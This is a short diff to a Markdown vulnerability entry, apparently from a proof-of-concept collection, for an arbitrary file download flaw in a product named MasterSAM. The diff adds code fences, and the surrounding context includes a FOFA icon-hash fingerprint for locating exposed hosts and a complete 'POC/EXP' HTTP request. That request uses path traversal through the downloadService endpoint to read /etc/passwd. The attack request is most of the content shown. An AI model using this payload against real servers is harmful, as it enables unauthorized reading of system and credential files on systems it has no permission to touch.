@@ -79,6 +79,7 @@ FOFA：icon_hash="-2145752394"
 
 POC/EXP：
 
+```http
 GET /adama/adama/downloadService?type=1&file=../../../../../etc/passwd HTTP/1.1
 Host: 127.0.0.1
 Connection: keep-alive
@@ -95,6 +96,7 @@ Sec-Fetch-Dest: document
 Accept-Encoding: gzip, deflate, br, zstd
 Accept-Language: zh-CN,zh;q=0.9
 
+```
 ![image-20250212122054777](./.resource/MasterSAM任意文件下载漏洞/media/image-20250212122054777.png)
 
 
